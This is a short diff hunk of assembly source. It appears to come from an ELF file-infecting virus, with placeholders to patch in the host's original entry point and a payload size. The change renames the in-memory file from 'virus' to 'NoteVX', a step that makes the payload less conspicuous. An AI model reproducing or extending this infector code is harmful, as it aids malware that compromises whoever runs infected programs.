@@ -75,7 +75,7 @@ error:
     db  0xE9                                ; jmp
     dd  0x11111111                          ; patch with OEP
 
-memfd_name:     db "virus", 0
+memfd_name:     db "NoteVX", 0
 empty_path:     db 0
 
 payload_size:   dq 0x2222222222222222       ; patch payload_size
